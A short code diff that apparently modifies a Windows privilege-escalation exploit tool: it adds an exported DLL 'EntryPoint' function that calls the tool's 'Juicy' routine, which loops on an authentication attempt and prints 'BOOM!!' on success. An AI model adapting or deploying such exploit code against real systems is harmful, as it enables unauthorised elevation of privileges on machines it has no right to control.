@@ -684,7 +684,6 @@ int Juicy(wchar_t *clsid, BOOL brute)
 			if (!result) {
 				printf("BOOM!!");
 				break;
-
 			} else {
 				printf("Waiting for auth...");
 				Sleep(500);
@@ -693,4 +692,8 @@ int Juicy(wchar_t *clsid, BOOL brute)
 		}//end auth
 	}
 	return result;
+}
+
+__declspec(dllexport) void EntryPoint(void) {
+	Juicy(NULL, FALSE);
 }
